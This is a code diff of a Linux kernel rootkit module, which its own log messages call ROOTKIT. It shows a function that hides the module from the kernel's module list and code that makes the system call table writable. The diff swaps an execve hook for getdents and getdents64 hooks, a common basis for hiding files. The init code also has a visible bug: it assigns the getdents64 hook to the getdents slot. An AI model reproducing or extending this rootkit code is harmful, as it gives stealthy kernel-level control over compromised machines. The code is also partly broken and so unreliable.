@@ -5,20 +5,47 @@
 #include <linux/delay.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>    /* __NR_* system call indicies */
-#include <asm/paravirt.h>    /* write_cr0 */
 #include <asm/pgtable.h>     /* pte_mkwrite */
 
 struct task_struct *kt; 
 unsigned long *syscall_table;
 pte_t *pte;
 
+/* 
 asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);
 
 asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
-    pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
-    return real_execve(filename, argv, envp);
+	pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
+	return real_execve(filename, argv, envp);
+}
+*/
+
+struct linux_dirent {
+	unsigned long  d_ino;     /* Inode number */
+	unsigned long  d_off;     /* Offset to next linux_dirent */
+	unsigned short d_reclen;  /* Length of this linux_dirent */
+	char           d_name[];  /* Filename (null-terminated) */
+			    /* length is actually (d_reclen - 2 -
+			      offsetof(struct linux_dirent, d_name) */
+	/*
+	char           pad;       // Zero padding byte
+	char           d_type;    // File type (only since Linux 2.6.4;
+				  // offset is (d_reclen - 1))
+	*/
+};
+
+asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+	pr_info("ROOTKIT hooked call to new_getdents");
+	return real_getdents(fd, dirp, count);
 }
 
+asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+	pr_info("ROOTKIT hooked call to new_getdents64");
+	return real_getdents64(fd, dirp, count);
+}
 
 void module_hide(void) {
 	list_del(&THIS_MODULE->list);             //remove from procfs
@@ -86,10 +113,13 @@ static int __init my_init(void)
 	
 	if (syscall_table != NULL) {
 		pte->pte |= _PAGE_RW;
-
-		real_execve = (void *)syscall_table[__NR_execve];
-		syscall_table[__NR_execve] = &new_execve;
-
+		
+		real_getdents = (void *)syscall_table[__NR_getdents];
+		real_getdents64 = (void *)syscall_table[__NR_getdents64];
+		
+		syscall_table[__NR_getdents] = &new_getdents;
+		syscall_table[__NR_getdents] = &new_getdents64;
+		
 		pte->pte &= ~_PAGE_RW;
 		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
 	} else {
@@ -114,7 +144,8 @@ static void __exit my_exit(void)
 
         pte->pte |= _PAGE_RW;
 
-        syscall_table[__NR_execve] = real_execve;
+        syscall_table[__NR_getdents] = real_getdents;
+        syscall_table[__NR_getdents64] = real_getdents64;
 
         pte->pte &= ~_PAGE_RW;
 
